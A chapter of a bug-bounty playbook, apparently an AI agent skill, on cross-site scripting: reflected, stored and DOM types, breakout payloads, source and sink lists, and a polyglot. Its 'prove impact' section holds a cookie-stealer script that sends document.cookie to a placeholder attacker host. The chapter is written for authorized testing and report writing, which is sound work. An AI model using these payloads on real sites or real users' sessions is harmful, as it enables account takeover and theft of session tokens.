# Ch 7 — Cross-Site Scripting (XSS)

> **Marker ceiling:** the cookie-stealer, keylogger, and BeEF payloads below are impact *narrative* for reports — identical pattern to `xss-cheat-sheet` ch04. On a live program `alert(document.domain)` proves the bug; victim delivery and session/token capture need explicit authorization, and real-user cookies are never collected.

Most-reported and most-paid bug class. Three types: reflected, stored, DOM. For deep payload technique see the `xss-cheat-sheet` skill — this chapter is the playbook's exploitation flow.

## Reflected XSS — break out of the context

Input reflects in the page. The question is never "does it reflect" but **where** — then break out accordingly.

- **Between tags** (`<b>INPUT</b>`): `<script>alert(0)</script>` if `<` isn't encoded.
- **Inside attribute** (`<input value="INPUT">`): break quotes + tag → `"><script>alert(0)</script>`.
- **`<>` both encoded**: use **event attributes** — inject inside the open tag: `" onfocus=alert(0) autofocus="` or `onmouseover`, `onclick`. No angle brackets needed.

## Stored XSS — think "what does the app save and display?"

Persisted input (DB/JSON/XML) rendered to every viewer — one payload hits all users. Prime spots: username, email, bio, address, comments, images, links. `<script>alert(0)</script>` in a comment field = everyone who views gets hit.

## DOM XSS — sources → sinks (pure client side)

Everything happens in the browser — audit the JS. Find a **source** (user-controllable) that flows into a dangerous **sink**.

**Sources**: `document.URL`, `document.documentURI`, `document.baseURI`, `location`, `location.href`, `location.search`, `location.hash`, `location.pathname`, `document.cookie`.

**Sinks**: `eval()`, `Function()`, `setTimeout(code,…)` / `setInterval(code,…)` (string args), `document.write()`, `element.innerHTML`.

Note: any function passed *as an argument* to these sinks executes — e.g. `?index=alert(0)` into `eval()` fires even though `alert` returns nothing.

## Polyglot — one payload, all contexts

Context is unpredictable; rather than guessing which breakout applies, throw the famous **0xsobky polyglot** covering javascript: URLs, attribute breakout, tag breakout, DOM:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert()
)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Beyond alert() — prove impact

Alert boxes get dismissed as "who cares". Demonstrate **account takeover** instead:

```html
<script>document.location='http://attacker-domain/cookiestealer?cookie='+document.cookie;</script>
```

Steal `document.cookie` → replay the session cookie → impersonate the victim. (Also consider keyloggers, CSRF-token theft, and beEF-style browser hooks for write-ups.)

## Prioritization

- Stored > reflected > DOM (impact radius).
- Auth'd admin pages → blind XSS (see xss-cheat-sheet skill).
- Always note *where* payload lands before crafting the breakout.
